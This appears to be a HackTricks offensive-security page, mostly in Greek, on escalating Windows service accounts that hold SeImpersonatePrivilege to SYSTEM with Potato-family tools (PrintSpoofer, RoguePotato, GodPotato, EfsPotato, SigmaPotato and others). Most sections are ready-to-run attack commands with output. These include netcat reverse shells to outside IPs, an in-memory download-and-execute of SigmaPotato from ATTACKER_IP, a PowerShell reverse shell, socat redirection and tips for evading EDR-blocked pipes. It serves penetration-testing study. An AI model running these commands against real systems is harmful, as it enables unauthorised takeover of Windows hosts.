# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και μετέπειτα. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για να **εκμεταλλευτούν τα ίδια προνόμια και να αποκτήσουν `NT AUTHORITY\SYSTEM`** επίπεδο πρόσβασης. Αυτό το [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) εμβαθύνει στο εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για να καταχραστεί impersonation privileges σε hosts με Windows 10 και Server 2019 όπου το JuicyPotato δεν λειτουργεί πλέον.

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι SigmaPotato (ένα fork του GodPotato) που προσθέτει χρήση in-memory/.NET reflection και εκτεταμένη υποστήριξη OS. Δείτε σύντομη χρήση παρακάτω και το repo στις References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνήθεις παγίδες

Όλες οι ακόλουθες τεχνικές στηρίζονται στην κατάχρηση μιας impersonation-capable privileged service από ένα πλαίσιο που κατέχει κάποιο από τα παρακάτω προνόμια:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- Το υψηλό επίπεδο ακεραιότητας δεν απαιτείται εάν το token έχει ήδη το SeImpersonatePrivilege (τυπικό για πολλούς λογαριασμούς υπηρεσίας όπως IIS AppPool, MSSQL, κ.λπ.)

Ελέγξτε τα προνόμια γρήγορα:
```cmd
whoami /priv | findstr /i impersonate
```
Λειτουργικές σημειώσεις:

- Αν το shell σας τρέχει υπό περιορισμένο token που δεν έχει SeImpersonatePrivilege (συχνό για Local Service/Network Service σε κάποιες περιπτώσεις), επανακτήστε τα προεπιλεγμένα δικαιώματα του λογαριασμού χρησιμοποιώντας FullPowers, και στη συνέχεια τρέξτε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- Το PrintSpoofer χρειάζεται την υπηρεσία Print Spooler να τρέχει και να είναι προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε περιβάλλοντα με ενισχυμένη ασφάλεια όπου ο Spooler είναι απενεργοποιημένος μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί έναν OXID resolver προσβάσιμο στο TCP/135. Αν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε έναν redirector/port-forwarder (βλέπε παράδειγμα παρακάτω). Παλαιότερες builds χρειάζονταν την παράμετρο -f.
- Τα EfsPotato/SharpEfsPotato καταχρώνται το MS-EFSR· αν ένας pipe είναι μπλοκαρισμένος, δοκιμάστε εναλλακτικούς pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το σφάλμα 0x6d3 κατά την RpcBindingSetAuthInfo συνήθως υποδηλώνει άγνωστη/μη υποστηριζόμενη RPC authentication service· δοκιμάστε διαφορετικό pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία τρέχει.

## Γρήγορη επίδειξη

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε -i για να ξεκινήσετε μια διαδραστική διεργασία στην τρέχουσα κονσόλα, ή -c για να εκτελέσετε ένα one-liner.
- Απαιτεί την υπηρεσία Spooler. Εάν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Εάν το outbound 135 είναι μπλοκαρισμένο, pivot τον OXID resolver μέσω socat στον redirector σας:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato είναι ένα νέο primitive κατάχρησης COM που κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί για Spooler/BITS. Το binary δημιουργεί τον PrintNotify COM server, αντικαθιστά το `IUnknown` με ένα ψεύτικο, και στη συνέχεια ενεργοποιεί ένα προνόμιο callback μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (τρέχοντας ως **SYSTEM**) επανασυνδεθεί, η διεργασία διπλασιάζει το επιστρεφόμενο token και εκκινεί το παρεχόμενο payload με πλήρη δικαιώματα.

Key operational notes:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022 αρκεί να είναι εγκατεστημένη η υπηρεσία Print Workflow/PrintNotify (υπάρχει ακόμα ακόμη και όταν ο legacy Spooler είναι απενεργοποιημένος μετά το PrintNightmare).
* Απαιτεί το context που καλεί να διαθέτει **SeImpersonatePrivilege** (συνήθως για IIS APPPOOL, MSSQL και λογαριασμούς υπηρεσίας scheduled-task).
* Δέχεται είτε απευθείας εντολή είτε interactive mode ώστε να παραμείνετε μέσα στην αρχική κονσόλα. Παράδειγμα:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Επειδή βασίζεται αποκλειστικά σε COM, δεν απαιτούνται named-pipe listeners ή εξωτερικοί redirectors, καθιστώντας το ένα drop-in replacement σε hosts όπου ο Defender μπλοκάρει το RPC binding του RoguePotato.
  
Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν ένα pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν service DCOM objects που έχουν προεπιλογή το RPC_C_IMP_LEVEL_IMPERSONATE. Κατασκευάστε ή χρησιμοποιήστε τα παρεχόμενα binaries και εκτελέστε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο GodPotato fork)

Το SigmaPotato προσθέτει σύγχρονες βελτιώσεις όπως in-memory execution μέσω .NET reflection και έναν βοηθό PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Αναφορές

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Επαναφορά προεπιλεγμένων token privileges για service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato σε SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Αποκάλυψη του Relay Network και των εσωτερικών λειτουργιών μιας κρυφής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
